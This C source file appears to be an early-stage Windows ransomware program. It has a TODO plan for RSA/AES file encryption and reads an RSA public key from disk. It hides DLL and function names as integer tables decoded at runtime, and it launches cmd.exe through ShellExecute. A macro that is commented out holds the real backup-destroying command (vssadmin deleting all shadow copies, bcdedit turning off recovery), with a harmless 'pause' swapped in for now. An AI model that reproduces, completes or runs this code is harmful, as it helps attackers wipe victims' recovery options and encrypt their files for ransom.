#include "util.h"

//#define RM_SHADOW_BACKUPS "/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"
#define RM_SHADOW_BACKUPS	"/c pause"
#define RSA_PUBKEY_SIZE		294

/* https://github.com/wine-mirror/wine/blob/master/include/wincrypt.h */
#define CRYPT_STRING_BINARY	0x00000002

#define SIZEOF_ARRAY(arr)	(sizeof(arr) / sizeof(arr[0]))

int
main(int argc, char **argv)
{
	/* TODO:
	 * [] Read RSA pubkey
	 * [X] Remove shadow backups
	 * [] dynamically load crypt32.dll | https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking
	 * [] Generate Client RSA key pair
	 * [] Encrypt Client RSA privkey with Server RSA pubkey
	 * [] Remove Client RSA privkey
	 * [] Generate AES key
	 * [] Encrypt file with AES
	 * [] Encrypt AES key with Client pubkey
	 * [] Remove AES key
	 * [] Save encrypted AES key
	*/
	HANDLE f;
	HINSTANCE hinst;
	FARPROC func_addr;

	char *rsa_pubkey = 0, *lib, *func;
	unsigned int pubkey_size;
	/* strings */
	const int CryptStringToBinaryA[] = {2, 43, 50, 41, 45, 18, 45, 43, 34, 39, 32, 19, 40, 1, 34, 39, 26, 43, 50, 0};
	const int crypt32_dll[] = {28, 43, 50, 41, 45, 55, 54, 62, 29, 37, 37};

	/*
	if ((rsa_pubkey = rsa_read_pubkey("TEST.txt")) < 0)
		die("Failed to retrieve AES Public Key");
	*/
	if ((f = CreateFile("pub", FILE_SHARE_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)) == INVALID_HANDLE_VALUE)
		die("Failed to open pubkey");
	rsa_pubkey = malloc(RSA_PUBKEY_SIZE);
	if (!ReadFile(f, rsa_pubkey, RSA_PUBKEY_SIZE, 0, 0))
		die("Failed to read pubkey");

	lib = alphabet_table_lookup(crypt32_dll, SIZEOF_ARRAY(crypt32_dll));
	func = alphabet_table_lookup(CryptStringToBinaryA, SIZEOF_ARRAY(CryptStringToBinaryA));
	if (!(hinst = LoadLibrary(lib)))
		die("Failed to import library\n");
	if (!(func_addr = GetProcAddress(hinst, func)))
		die("Failed to get address of function\n");
	/* CryptStringToBinaryA(rsa_pubkey, RSA_PUBKEY_SIZE, CRYPT_STRING_BINARY, 0, &pubkey_size, 0, 0) */
	if (!func_addr(rsa_pubkey, RSA_PUBKEY_SIZE, CRYPT_STRING_BINARY, 0, &pubkey_size, 0, 0))
		die("failed to get size of pubkey");
	printf("pubkeysize: %lu", pubkey_size);

	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW);

	free(rsa_pubkey);
	return 0;
}

